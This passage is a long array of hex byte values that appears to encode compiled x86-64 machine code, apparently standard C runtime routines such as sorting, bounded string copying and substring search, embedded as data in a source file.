0xc6, 0xff, 0xff, 0x90, 0x48, 0x8b, 0x15, 0x80, 0x7, 0x1, 0x0, 0x48, 0x8b, 0xcf, 0xe8, 0x28, 0x0, 0x0, 0x0, 0x48, 0x8b, 0xd8, 0xb9, 0x4, 0x0, 0x0, 0x0, 0xe8, 0x6f, 0xc6, 0xff, 0xff, 0x48, 0x85, 0xdb, 0x74, 0xe, 0x48, 0x8b, 0xc3, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xe8, 0x8f, 0xbc, 0xff, 0xff, 0x90, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x20, 0x48, 0x8b, 0xfa, 0x48, 0x85, 0xd2, 0x74, 0x46, 0x48, 0x85, 0xc9, 0x74, 0x41, 0x48, 0x8b, 0x19, 0x48, 0x3b, 0xda, 0x75, 0x5, 0x48, 0x8b, 0xc7, 0xeb, 0x36, 0x48, 0x89, 0x39, 0x48, 0x8b, 0xcf, 0xe8, 0x2d, 0xfc, 0xff, 0xff, 0x48, 0x85, 0xdb, 0x74, 0xeb, 0x48, 0x8b, 0xcb, 0xe8, 0xac, 0xfe, 0xff, 0xff, 0x83, 0x7b, 0x10, 0x0, 0x75, 0xdd, 0x48, 0x8d, 0x5, 0x6f, 0xf6, 0x0, 0x0, 0x48, 0x3b, 0xd8, 0x74, 0xd1, 0x48, 0x8b, 0xcb, 0xe8, 0x92, 0xfc, 0xff, 0xff, 0xeb, 0xc7, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0xcc, 0xcc, 0xcc, 0x8b, 0x5, 0x16, 0x7, 0x1, 0x0, 0xc3, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0xcc, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x48, 0x81, 0xec, 0x50, 0x4, 0x0, 0x0, 0x48, 0x8b, 0x5, 0x9c, 0xf0, 0x0, 0x0, 0x48, 0x33, 0xc4, 0x48, 0x89, 0x84, 0x24, 0x10, 0x4, 0x0, 0x0, 0x4d, 0x8b, 0xe1, 0x4d, 0x8b, 0xf0, 0x4c, 0x8b, 0xe9, 0x48, 0x85, 0xc9, 0x75, 0x1a, 0x48, 0x85, 0xd2, 0x74, 0x15, 0xe8, 0xc1, 0xca, 0xff, 0xff, 0xc7, 0x0, 0x16, 0x0, 0x0, 0x0, 0xe8, 0x7a, 0xc9, 0xff, 0xff, 0xe9, 0xa9, 0x3, 0x0, 0x0, 0x4d, 0x85, 0xf6, 0x74, 0xe6, 0x4d, 0x85, 0xe4, 0x74, 0xe1, 0x48, 0x83, 0xfa, 0x2, 0xf, 0x82, 0x95, 0x3, 0x0, 0x0, 0x48, 0x89, 0x9c, 0x24, 0x48, 0x4, 0x0, 0x0, 0x48, 0x89, 0xac, 0x24, 0x40, 0x4, 0x0, 0x0, 0x48, 0x89, 0xb4, 0x24, 0x38, 0x4, 0x0, 0x0, 0x48, 0x89, 0xbc, 0x24, 0x30, 0x4, 0x0, 0x0, 0x4c, 0x89, 0xbc, 0x24, 0x28, 0x4, 0x0, 0x0, 0x4c, 0x8d, 0x7a, 0xff, 0x4d, 0xf, 0xaf, 0xfe, 0x4c, 0x3, 0xf9, 0x33, 0xc9, 0x48, 0x89, 0x4c, 0x24, 0x20, 0x66, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x33, 0xd2, 0x49, 0x8b, 0xc7, 0x49, 0x2b, 0xc5, 0x49, 0xf7, 0xf6, 0x48, 0x8d, 0x58, 0x1, 0x48, 0x83, 0xfb, 0x8, 0xf, 0x87, 0x9b, 0x0, 0x0, 0x0, 0x4d, 0x3b, 0xfd, 0x76, 0x75, 0x4b, 0x8d, 0x34, 0x2e, 0x49, 0x8b, 0xdd, 0x48, 0x8b, 0xfe, 0x49, 0x3b, 0xf7, 0x77, 0x2a, 0xf, 0x1f, 0x0, 0x49, 0xba, 0x70, 0x89, 0xde, 0x5e, 0x95, 0xb7, 0x75, 0x93, 0x48, 0x8b, 0xd3, 0x48, 0x8b, 0xcf, 0x49, 0x8b, 0xc4, 0xff, 0x15, 0x4f, 0x51, 0x0, 0x0, 0x85, 0xc0, 0x48, 0xf, 0x4f, 0xdf, 0x49, 0x3, 0xfe, 0x49, 0x3b, 0xff, 0x76, 0xd9, 0x4d, 0x8b, 0xc6, 0x49, 0x8b, 0xd7, 0x49, 0x3b, 0xdf, 0x74, 0x24, 0x49, 0x2b, 0xdf, 0x66, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf, 0xb6, 0x2, 0xf, 0xb6, 0xc, 0x13, 0x88, 0x4, 0x13, 0x88, 0xa, 0x48, 0x8d, 0x52, 0x1, 0x49, 0x83, 0xe8, 0x1, 0x75, 0xea, 0x4d, 0x2b, 0xfe, 0x4d, 0x3b, 0xfd, 0x77, 0x94, 0x48, 0x8b, 0x4c, 0x24, 0x20, 0x48, 0x83, 0xe9, 0x1, 0x48, 0x89, 0x4c, 0x24, 0x20, 0xf, 0x88, 0x86, 0x2, 0x0, 0x0, 0x4c, 0x8b, 0x6c, 0xcc, 0x30, 0x4c, 0x8b, 0xbc, 0xcc, 0x20, 0x2, 0x0, 0x0, 0xe9, 0x4c, 0xff, 0xff, 0xff, 0x48, 0xd1, 0xeb, 0x49, 0xf, 0xaf, 0xde, 0x4a, 0x8d, 0x34, 0x2b, 0x49, 0xba, 0x70, 0x89, 0xde, 0x5e, 0x95, 0xb7, 0x75, 0x93, 0x48, 0x8b, 0xd6, 0x49, 0x8b, 0xcd, 0x49, 0x8b, 0xc4, 0xff, 0x15, 0xc0, 0x50, 0x0, 0x0, 0x85, 0xc0, 0x7e, 0x2f, 0x4d, 0x8b, 0xce, 0x4c, 0x8b, 0xc6, 0x4c, 0x3b, 0xee, 0x74, 0x24, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0x41, 0xf, 0xb6, 0x0, 0x49, 0x8b, 0xd0, 0x48, 0x2b, 0xd3, 0xf, 0xb6, 0xa, 0x88, 0x2, 0x41, 0x88, 0x8, 0x49, 0xff, 0xc0, 0x49, 0x83, 0xe9, 0x1, 0x75, 0xe5, 0x49, 0xba, 0x70, 0x89, 0xde, 0x5e, 0x95, 0xb7, 0x75, 0x93, 0x49, 0x8b, 0xd7, 0x49, 0x8b, 0xcd, 0x49, 0x8b, 0xc4, 0xff, 0x15, 0x74, 0x50, 0x0, 0x0, 0x85, 0xc0, 0x7e, 0x30, 0x4d, 0x8b, 0xc6, 0x49, 0x8b, 0xd7, 0x4d, 0x3b, 0xef, 0x74, 0x25, 0x4d, 0x8b, 0xcd, 0x4d, 0x2b, 0xcf, 0xf, 0x1f, 0x80, 0x0, 0x0, 0x0, 0x0, 0xf, 0xb6, 0x2, 0x41, 0xf, 0xb6, 0xc, 0x11, 0x41, 0x88, 0x4, 0x11, 0x88, 0xa, 0x48, 0x8d, 0x52, 0x1, 0x49, 0x83, 0xe8, 0x1, 0x75, 0xe8, 0x49, 0xba, 0x70, 0x89, 0xde, 0x5e, 0x95, 0xb7, 0x75, 0x93, 0x49, 0x8b, 0xd7, 0x48, 0x8b, 0xce, 0x49, 0x8b, 0xc4, 0xff, 0x15, 0x27, 0x50, 0x0, 0x0, 0x85, 0xc0, 0x7e, 0x33, 0x4d, 0x8b, 0xc6, 0x49, 0x8b, 0xd7, 0x49, 0x3b, 0xf7, 0x74, 0x28, 0x4c, 0x8b, 0xce, 0x4d, 0x2b, 0xcf, 0x66, 0x66, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf, 0xb6, 0x2, 0x41, 0xf, 0xb6, 0xc, 0x11, 0x41, 0x88, 0x4, 0x11, 0x88, 0xa, 0x48, 0x8d, 0x52, 0x1, 0x49, 0x83, 0xe8, 0x1, 0x75, 0xe8, 0x49, 0x8b, 0xdd, 0x49, 0x8b, 0xff, 0x66, 0x90, 0x48, 0x3b, 0xf3, 0x76, 0x2b, 0x49, 0x3, 0xde, 0x48, 0x3b, 0xde, 0x73, 0x23, 0x49, 0xba, 0x70, 0x89, 0xde, 0x5e, 0x95, 0xb7, 0x75, 0x93, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcb, 0x49, 0x8b, 0xc4, 0xff, 0x15, 0xc2, 0x4f, 0x0, 0x0, 0x85, 0xc0, 0x7e, 0xdb, 0xeb, 0x29, 0xf, 0x1f, 0x40, 0x0, 0x49, 0x3, 0xde, 0x49, 0x3b, 0xdf, 0x77, 0x1d, 0x49, 0xba, 0x70, 0x89, 0xde, 0x5e, 0x95, 0xb7, 0x75, 0x93, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcb, 0x49, 0x8b, 0xc4, 0xff, 0x15, 0x97, 0x4f, 0x0, 0x0, 0x85, 0xc0, 0x7e, 0xdb, 0x48, 0x8b, 0xef, 0x49, 0x2b, 0xfe, 0x48, 0x3b, 0xfe, 0x76, 0x1d, 0x49, 0xba, 0x70, 0x89, 0xde, 0x5e, 0x95, 0xb7, 0x75, 0x93, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcf, 0x49, 0x8b, 0xc4, 0xff, 0x15, 0x6f, 0x4f, 0x0, 0x0, 0x85, 0xc0, 0x7f, 0xd8, 0x48, 0x3b, 0xfb, 0x72, 0x38, 0x4d, 0x8b, 0xc6, 0x48, 0x8b, 0xd7, 0x74, 0x1e, 0x4c, 0x8b, 0xcb, 0x4c, 0x2b, 0xcf, 0xf, 0xb6, 0x2, 0x41, 0xf, 0xb6, 0xc, 0x11, 0x41, 0x88, 0x4, 0x11, 0x88, 0xa, 0x48, 0x8d, 0x52, 0x1, 0x49, 0x83, 0xe8, 0x1, 0x75, 0xe8, 0x48, 0x3b, 0xf7, 0x48, 0x8b, 0xc3, 0x48, 0xf, 0x45, 0xc6, 0x48, 0x8b, 0xf0, 0xe9, 0x46, 0xff, 0xff, 0xff, 0x48, 0x3b, 0xf5, 0x73, 0x28, 0x90, 0x49, 0x2b, 0xee, 0x48, 0x3b, 0xee, 0x76, 0x1f, 0x49, 0xba, 0x70, 0x89, 0xde, 0x5e, 0x95, 0xb7, 0x75, 0x93, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcd, 0x49, 0x8b, 0xc4, 0xff, 0x15, 0x7, 0x4f, 0x0, 0x0, 0x85, 0xc0, 0x74, 0xdb, 0xeb, 0x25, 0x49, 0x2b, 0xee, 0x49, 0x3b, 0xed, 0x76, 0x1d, 0x49, 0xba, 0x70, 0x89, 0xde, 0x5e, 0x95, 0xb7, 0x75, 0x93, 0x48, 0x8b, 0xd6, 0x48, 0x8b, 0xcd, 0x49, 0x8b, 0xc4, 0xff, 0x15, 0xe0, 0x4e, 0x0, 0x0, 0x85, 0xc0, 0x74, 0xdb, 0x49, 0x8b, 0xcf, 0x48, 0x8b, 0xc5, 0x48, 0x2b, 0xcb, 0x49, 0x2b, 0xc5, 0x48, 0x3b, 0xc1, 0x48, 0x8b, 0x4c, 0x24, 0x20, 0x7c, 0x2b, 0x4c, 0x3b, 0xed, 0x73, 0x15, 0x4c, 0x89, 0x6c, 0xcc, 0x30, 0x48, 0x89, 0xac, 0xcc, 0x20, 0x2, 0x0, 0x0, 0x48, 0xff, 0xc1, 0x48, 0x89, 0x4c, 0x24, 0x20, 0x49, 0x3b, 0xdf, 0xf, 0x83, 0x9e, 0xfd, 0xff, 0xff, 0x4c, 0x8b, 0xeb, 0xe9, 0x3, 0xfd, 0xff, 0xff, 0x49, 0x3b, 0xdf, 0x73, 0x15, 0x48, 0x89, 0x5c, 0xcc, 0x30, 0x4c, 0x89, 0xbc, 0xcc, 0x20, 0x2, 0x0, 0x0, 0x48, 0xff, 0xc1, 0x48, 0x89, 0x4c, 0x24, 0x20, 0x4c, 0x3b, 0xed, 0xf, 0x83, 0x73, 0xfd, 0xff, 0xff, 0x4c, 0x8b, 0xfd, 0xe9, 0xd8, 0xfc, 0xff, 0xff, 0x48, 0x8b, 0xbc, 0x24, 0x30, 0x4, 0x0, 0x0, 0x48, 0x8b, 0xb4, 0x24, 0x38, 0x4, 0x0, 0x0, 0x48, 0x8b, 0xac, 0x24, 0x40, 0x4, 0x0, 0x0, 0x48, 0x8b, 0x9c, 0x24, 0x48, 0x4, 0x0, 0x0, 0x4c, 0x8b, 0xbc, 0x24, 0x28, 0x4, 0x0, 0x0, 0x48, 0x8b, 0x8c, 0x24, 0x10, 0x4, 0x0, 0x0, 0x48, 0x33, 0xcc, 0xe8, 0x20, 0x3b, 0x0, 0x0, 0x48, 0x81, 0xc4, 0x50, 0x4, 0x0, 0x0, 0x41, 0x5e, 0x41, 0x5d, 0x41, 0x5c, 0xc3, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x48, 0x83, 0xec, 0x20, 0x45, 0x33, 0xd2, 0x49, 0x8b, 0xd8, 0x4c, 0x8b, 0xda, 0x4d, 0x85, 0xc9, 0x75, 0x31, 0x48, 0x85, 0xc9, 0x75, 0x31, 0x48, 0x85, 0xd2, 0x74, 0x14, 0xe8, 0xbc, 0xc6, 0xff, 0xff, 0xbb, 0x16, 0x0, 0x0, 0x0, 0x89, 0x18, 0xe8, 0x74, 0xc5, 0xff, 0xff, 0x44, 0x8b, 0xd3, 0x48, 0x8b, 0x5c, 0x24, 0x30, 0x41, 0x8b, 0xc2, 0x48, 0x8b, 0x74, 0x24, 0x38, 0x48, 0x83, 0xc4, 0x20, 0x5f, 0xc3, 0x48, 0x85, 0xc9, 0x74, 0xd4, 0x4d, 0x85, 0xdb, 0x74, 0xcf, 0x4d, 0x85, 0xc9, 0x75, 0x5, 0x44, 0x88, 0x11, 0xeb, 0xd9, 0x48, 0x85, 0xdb, 0x75, 0x5, 0x44, 0x88, 0x11, 0xeb, 0xbb, 0x48, 0x2b, 0xd9, 0x48, 0x8b, 0xd1, 0x4d, 0x8b, 0xc3, 0x49, 0x8b, 0xf9, 0x49, 0x83, 0xf9, 0xff, 0x75, 0x14, 0x8a, 0x4, 0x13, 0x88, 0x2, 0x48, 0xff, 0xc2, 0x84, 0xc0, 0x74, 0xb1, 0x49, 0x83, 0xe8, 0x1, 0x75, 0xee, 0xeb, 0x2e, 0x8a, 0x4, 0x13, 0x48, 0x8b, 0xf7, 0x88, 0x2, 0x48, 0xff, 0xc2, 0x84, 0xc0, 0x74, 0x9a, 0x49, 0x83, 0xe8, 0x1, 0x74, 0x6, 0x48, 0x83, 0xef, 0x1, 0x75, 0xe5, 0x4d, 0x85, 0xc0, 0x48, 0x8d, 0x46, 0xff, 0x48, 0xf, 0x44, 0xc6, 0x48, 0x85, 0xc0, 0x75, 0x3, 0x44, 0x88, 0x12, 0x4d, 0x85, 0xc0, 0xf, 0x85, 0x72, 0xff, 0xff, 0xff, 0x49, 0x83, 0xf9, 0xff, 0x75, 0xe, 0x46, 0x88, 0x54, 0x19, 0xff, 0x45, 0x8d, 0x50, 0x50, 0xe9, 0x5e, 0xff, 0xff, 0xff, 0x44, 0x88, 0x11, 0xe8, 0x3, 0xc6, 0xff, 0xff, 0xbb, 0x22, 0x0, 0x0, 0x0, 0xe9, 0x42, 0xff, 0xff, 0xff, 0xcc, 0x48, 0x83, 0xec, 0x58, 0x48, 0x8b, 0x5, 0xa5, 0xeb, 0x0, 0x0, 0x48, 0x33, 0xc4, 0x48, 0x89, 0x44, 0x24, 0x40, 0x33, 0xc0, 0x4c, 0x8b, 0xca, 0x48, 0x83, 0xf8, 0x20, 0x4c, 0x8b, 0xc1, 0x73, 0x77, 0xc6, 0x44, 0x4, 0x20, 0x0, 0x48, 0xff, 0xc0, 0x48, 0x83, 0xf8, 0x20, 0x7c, 0xf0, 0x8a, 0x2, 0xeb, 0x1f, 0xf, 0xb6, 0xd0, 0x48, 0xc1, 0xea, 0x3, 0xf, 0xb6, 0xc0, 0x83, 0xe0, 0x7, 0xf, 0xb6, 0x4c, 0x14, 0x20, 0xf, 0xab, 0xc1, 0x49, 0xff, 0xc1, 0x88, 0x4c, 0x14, 0x20, 0x41, 0x8a, 0x1, 0x84, 0xc0, 0x75, 0xdd, 0xeb, 0x1f, 0x41, 0xf, 0xb6, 0xc1, 0xba, 0x1, 0x0, 0x0, 0x0, 0x41, 0xf, 0xb6, 0xc9, 0x83, 0xe1, 0x7, 0x48, 0xc1, 0xe8, 0x3, 0xd3, 0xe2, 0x84, 0x54, 0x4, 0x20, 0x75, 0x1f, 0x49, 0xff, 0xc0, 0x45, 0x8a, 0x8, 0x45, 0x84, 0xc9, 0x75, 0xd9, 0x33, 0xc0, 0x48, 0x8b, 0x4c, 0x24, 0x40, 0x48, 0x33, 0xcc, 0xe8, 0x92, 0x39, 0x0, 0x0, 0x48, 0x83, 0xc4, 0x58, 0xc3, 0x49, 0x8b, 0xc0, 0xeb, 0xe9, 0xe8, 0xb3, 0x3a, 0x0, 0x0, 0xcc, 0xcc, 0xcc, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x48, 0x89, 0x74, 0x24, 0x10, 0x57, 0x4c, 0x8b, 0xd2, 0x48, 0x8d, 0x35, 0xbb, 0x59, 0xff, 0xff, 0x41, 0x83, 0xe2, 0xf, 0x48, 0x8b, 0xfa, 0x49, 0x2b, 0xfa, 0x48, 0x8b, 0xda, 0x4c, 0x8b, 0xc1, 0xf, 0x57, 0xdb, 0x49, 0x8d, 0x42, 0xff, 0xf3, 0xf, 0x6f, 0xf, 0x48, 0x83, 0xf8, 0xe, 0x77, 0x73, 0x8b, 0x84, 0x86, 0x3c, 0xa9, 0x0, 0x0, 0x48, 0x3, 0xc6, 0xff, 0xe0, 0x66, 0xf, 0x73, 0xd9, 0x1, 0xeb, 0x60, 0x66, 0xf, 0x73, 0xd9, 0x2, 0xeb, 0x59, 0x66, 0xf, 0x73, 0xd9, 0x3, 0xeb, 0x52, 0x66, 0xf, 0x73, 0xd9, 0x4, 0xeb, 0x4b, 0x66, 0xf, 0x73, 0xd9, 0x5, 0xeb, 0x44, 0x66, 0xf, 0x73, 0xd9, 0x6, 0xeb, 0x3d, 0x66, 0xf, 0x73, 0xd9, 0x7, 0xeb, 0x36, 0x66, 0xf, 0x73, 0xd9, 0x8, 0xeb, 0x2f, 0x66, 0xf, 0x73, 0xd9, 0x9, 0xeb, 0x28, 0x66, 0xf, 0x73, 0xd9, 0xa, 0xeb, 0x21, 0x66, 0xf, 0x73, 0xd9, 0xb, 0xeb, 0x1a, 0x66, 0xf, 0x73, 0xd9, 0xc, 0xeb, 0x13, 0x66, 0xf, 0x73, 0xd9, 0xd, 0xeb, 0xc, 0x66, 0xf, 0x73, 0xd9, 0xe, 0xeb, 0x5, 0x66, 0xf, 0x73, 0xd9, 0xf, 0xf, 0x57, 0xc0, 0x41, 0xb9, 0xf, 0x0, 0x0, 0x0, 0x66, 0xf, 0x74, 0xc1, 0x66, 0xf, 0xd7, 0xc0, 0x85, 0xc0, 0xf, 0x84, 0x33, 0x1, 0x0, 0x0, 0xf, 0xbc, 0xd0, 0x4d, 0x85, 0xd2, 0x75, 0x6, 0x45, 0x8d, 0x59, 0xf2, 0xeb, 0x14, 0x45, 0x33, 0xdb, 0x8b, 0xc2, 0xb9, 0x10, 0x0, 0x0, 0x0, 0x49, 0x2b, 0xca, 0x48, 0x3b, 0xc1, 0x41, 0xf, 0x92, 0xc3, 0x41, 0x8b, 0xc1, 0x2b, 0xc2, 0x41, 0x3b, 0xc1, 0xf, 0x87, 0xcf, 0x0, 0x0, 0x0, 0x8b, 0x8c, 0x86, 0x78, 0xa9, 0x0, 0x0, 0x48, 0x3, 0xce, 0xff, 0xe1, 0x66, 0xf, 0x73, 0xf9, 0x1, 0x66, 0xf, 0x73, 0xd9, 0x1, 0xe9, 0xb4, 0x0, 0x0, 0x0, 0x66, 0xf, 0x73, 0xf9, 0x2, 0x66, 0xf, 0x73, 0xd9, 0x2, 0xe9, 0xa5, 0x0, 0x0, 0x0, 0x66, 0xf, 0x73, 0xf9, 0x3, 0x66, 0xf, 0x73, 0xd9, 0x3, 0xe9, 0x96, 0x0, 0x0, 0x0, 0x66, 0xf, 0x73, 0xf9, 0x4, 0x66, 0xf, 0x73, 0xd9, 0x4, 0xe9, 0x87, 0x0, 0x0, 0x0, 0x66, 0xf, 0x73, 0xf9, 0x5, 0x66, 0xf, 0x73, 0xd9, 0x5, 0xeb, 0x7b, 0x66, 0xf, 0x73, 0xf9, 0x6, 0x66, 0xf, 0x73, 0xd9, 0x6, 0xeb, 0x6f, 0x66, 0xf, 0x73, 0xf9, 0x7, 0x66, 0xf, 0x73, 0xd9, 0x7, 0xeb, 0x63, 0x66, 0xf, 0x73, 0xf9, 0x8, 0x66, 0xf, 0x73, 0xd9, 0x8, 0xeb, 0x57, 0x66, 0xf, 0x73, 0xf9, 0x9, 0x66, 0xf, 0x73, 0xd9, 0x9, 0xeb, 0x4b, 0x66, 0xf, 0x73, 0xf9, 0xa, 0x66, 0xf, 0x73, 0xd9, 0xa, 0xeb, 0x3f, 0x66, 0xf, 0x73, 0xf9, 0xb, 0x66, 0xf, 0x73, 0xd9, 0xb, 0xeb, 0x33, 0x66, 0xf, 0x73, 0xf9, 0xc, 0x66, 0xf, 0x73, 0xd9, 0xc, 0xeb, 0x27, 0x66, 0xf, 0x73, 0xf9, 0xd, 0x66, 0xf, 0x73, 0xd9, 0xd, 0xeb, 0x1b, 0x66, 0xf, 0x73, 0xf9, 0xe, 0x66, 0xf, 0x73, 0xd9, 0xe, 0xeb, 0xf, 0x66, 0xf, 0x73, 0xf9, 0xf, 0x66, 0xf, 0x73, 0xd9, 0xf, 0xeb, 0x3, 0xf, 0x57, 0xc9, 0x45, 0x85, 0xdb, 0xf, 0x85, 0xe2, 0x0, 0x0, 0x0, 0xf3, 0xf, 0x6f, 0x57, 0x10, 0x66, 0xf, 0x6f, 0xc2, 0x66, 0xf, 0x74, 0xc3, 0x66, 0xf, 0xd7, 0xc0, 0x85, 0xc0, 0x75, 0x35, 0x48, 0x8b, 0xd3, 0x49, 0x8b, 0xc8, 0x48, 0x8b, 0x5c, 0x24, 0x10, 0x48, 0x8b, 0x74, 0x24, 0x18, 0x5f, 0xe9, 0x6b, 0xfd, 0xff, 0xff, 0x4d, 0x85, 0xd2, 0x75, 0xd0, 0x44, 0x38, 0x57, 0x1, 0xf, 0x84, 0xa8, 0x0, 0x0, 0x0, 0x48, 0x8b, 0x5c, 0x24, 0x10, 0x48, 0x8b, 0x74, 0x24, 0x18, 0x5f, 0xe9, 0x4c, 0xfd, 0xff, 0xff, 0xf, 0xbc, 0xc8, 0x8b, 0xc1, 0x49, 0x2b, 0xc2, 0x48, 0x83, 0xc0, 0x10, 0x48, 0x83, 0xf8, 0x10, 0x77, 0xb9, 0x44, 0x2b, 0xc9, 0x41, 0x83, 0xf9, 0xf, 0x77, 0x79, 0x42, 0x8b, 0x8c, 0x8e, 0xb8, 0xa9, 0x0, 0x0, 0x48, 0x3, 0xce, 0xff, 0xe1, 0x66, 0xf, 0x73, 0xfa, 0x1, 0xeb, 0x65, 0x66, 0xf, 0x73, 0xfa, 0x2, 0xeb, 0x5e, 0x66, 0xf, 0x73, 0xfa, 0x3, 0xeb, 0x57, 0x66, 0xf, 0x73, 0xfa, 0x4, 0xeb, 0x50, 0x66, 0xf, 0x73, 0xfa, 0x5, 0xeb, 0x49, 0x66, 0xf, 0x73, 0xfa, 0x6, 0xeb, 0x42, 0x66, 0xf, 0x73, 0xfa, 0x7, 0xeb, 0x3b, 0x66, 0xf, 0x73, 0xfa, 0x8, 0xeb, 0x34, 0x66, 0xf, 0x73, 0xfa, 0x9, 0xeb, 0x2d, 0x66, 0xf, 0x73, 0xfa, 0xa, 0xeb, 0x26, 0x66, 0xf, 0x73, 0xfa, 0xb, 0xeb, 0x1f, 0x66, 0xf, 0x73, 0xfa, 0xc, 0xeb, 0x18, 0x66, 0xf, 0x73, 0xfa, 0xd, 0xeb, 0x11, 0x66, 0xf, 0x73, 0xfa, 0xe, 0xeb, 0xa, 0x66, 0xf, 0x73, 0xfa, 0xf, 0xeb, 0x3, 0xf, 0x57, 0xd2, 0x66, 0xf, 0xeb, 0xca, 0x41, 0xf, 0xb6, 0x0, 0x84, 0xc0, 0x74, 0x38, 0xf, 0x1f, 0x40, 0x0, 0xf, 0x1f, 0x84, 0x0, 0x0, 0x0, 0x0, 0x0, 0xf, 0xbe, 0xc0, 0x66, 0xf, 0x6e, 0xc0, 0x66, 0xf, 0x60, 0xc0, 0x66, 0xf, 0x60, 0xc0, 0x66, 0xf, 0x70, 0xc0, 0x0, 0x66, 0xf, 0x74, 0xc1, 0x66, 0xf, 0xd7, 0xc0, 0x85, 0xc0, 0x75, 0x1a, 0x41, 0xf, 0xb6, 0x40, 0x1, 0x49, 0xff, 0xc0, 0x84, 0xc0, 0x75, 0xd4, 0x33, 0xc0, 0x48, 0x8b, 0x5c, 0x24, 0x10, 0x48, 0x8b, 0x74, 0x24, 0x18, 0x5f, 0xc3, 0x48, 0x8b, 0x5c, 0x24, 0x10, 0x49, 0x8b, 0xc0, 0x48, 0x8b, 0x74, 0x24, 0x18, 0x5f, 0xc3, 0xf, 0x1f, 0x0, 0x72, 0xa6, 0x0, 0x0, 0x79, 0xa6, 0x0, 0x0, 0x80, 0xa6, 0x0, 0x0, 0x87, 0xa6, 0x0, 0x0, 0x8e, 0xa6, 0x0, 0x0, 0x95, 0xa6, 0x0, 0x0, 0x9c, 0xa6, 0x0, 0x0, 0xa3, 0xa6, 0x0, 0x0, 0xaa, 0xa6, 0x0, 0x0, 0xb1, 0xa6, 0x0, 0x0, 0xb8, 0xa6, 0x0, 0x0, 0xbf, 0xa6, 0x0, 0x0, 0xc6, 0xa6, 0x0, 0x0, 0xcd, 0xa6, 0x0, 0x0, 0xd4, 0xa6, 0x0, 0x0, 0x2e, 0xa7, 0x0, 0x0, 0x3d, 0xa7, 0x0, 0x0, 0x4c, 0xa7, 0x0, 0x0, 0x5b, 0xa7, 0x0, 0x0, 0x6a, 0xa7, 0x0, 0x0, 0x76, 0xa7, 0x0, 0x0, 0x82, 0xa7, 0x0, 0x0, 0x8e, 0xa7, 0x0, 0x0, 0x9a, 0xa7, 0x0, 0x0, 0xa6, 0xa7, 0x0, 0x0, 0xb2, 0xa7, 0x0, 0x0, 0xbe, 0xa7, 0x0, 0x0, 0xca, 0xa7, 0x0, 0x0, 0xd6, 0xa7, 0x0, 0x0, 0xe2, 0xa7, 0x0, 0x0, 0xee, 0xa7, 0x0, 0x0, 0x6c, 0xa8, 0x0, 0x0, 0x73, 0xa8, 0x0, 0x0, 0x7a, 0xa8, 0x0, 0x0, 0x81, 0xa8, 0x0, 0x0, 0x88, 0xa8, 0x0, 0x0, 0x8f, 0xa8, 0x0, 0x0, 0x96, 0xa8, 0x0, 0x0, 0x9d, 0xa8, 0x0, 0x0, 0xa4, 0xa8, 0x0, 0x0, 0xab, 0xa8, 0x0, 0x0, 0xb2, 0xa8, 0x0, 0x0, 0xb9, 0xa8, 0x0, 0x0, 0xc0, 0xa8, 0x0, 0x0, 0xc7, 0xa8, 0x0, 0x0, 0xce, 0xa8, 0x0, 0x0, 0xd5, 0xa8, 0x0, 0x0, 0x45, 0x33, 0xc0, 0xe9, 0x0, 0x0, 0x0, 0x0, 0x48, 0x89, 0x5c, 0x24, 0x8, 0x57, 0x48, 0x83, 0xec, 0x40, 0x48, 0x8b, 0xda, 0x48, 0x8b, 0xf9, 0x48, 0x85, 0xc9, 0x75, 0x14, 0xe8, 0x6e, 0xc1, 0xff, 0xff, 0xc7, 0x0, 0x16, 0x0, 0x0, 0x0, 0xe8, 0x27, 0xc0, 0xff, 0xff, 0x33, 0xc0, 0xeb, 0x60, 0x48, 0x85, 0xdb, 0x74, 0xe7, 0x48, 0x3b, 0xfb, 0x73, 0xf2, 0x49, 0x8b, 0xd0, 0x48, 0x8d, 0x4c, 0x24, 0x20, 0xe8, 0x54, 0xcc, 0xff, 0xff, 0x48, 0x8b, 0x4c, 0x24, 0x30, 0x48, 0x8d, 0x53, 0xff, 0x83, 0x79, 0x8, 0x0, 0x74, 0x24, 0x48, 0xff, 0xca, 0x48, 0x3b, 0xfa, 0x77, 0xa, 0xf, 0xb6, 0x2, 0xf6, 0x44, 0x8, 0x19, 0x4, 0x75, 0xee, 0x48, 0x8b, 0xcb, 0x48, 0x2b, 0xca, 0x48, 0x8b, 0xd3, 0x83, 0xe1, 0x1, 0x48, 0x2b, 0xd1, 0x48, 0xff, 0xca, 0x80, 0x7c, 0x24, 0x38, 0x0, 0x74, 0xc, 0x48, 0x8b, 0x4c, 0x24, 0x20, 0x83, 0xa1, 0xa8, 0x3, 0x0, 0x0, 0xfd, 0x48, 0x8b, 0xc2, 0x48, 0x8b, 0x5c, 0x24, 0x50, 0x48, 0x83, 0xc4, 0x40, 0x5f, 0xc3, 0x40, 0x55, 0x41, 0x54, 0x41, 0x55, 0x41, 0x56, 0x41, 0x57, 0x48, 0x83, 0xec, 0x60, 0x48, 0x8d, 0x6c, 0x24, 0x30, 0x48, 0x89, 0x5d, 0x60, 0x48, 0x89, 0x75, 0x68, 0x48, 0x89, 0x7d, 0x70, 0x48, 0x8b, 0x5, 0x86, 0xe6, 0x0, 0x0, 0x48, 0x33, 0xc5, 0x48, 0x89, 0x45, 0x20, 0x44, 0x8b, 0xea, 0x45, 0x8b, 0xf9, 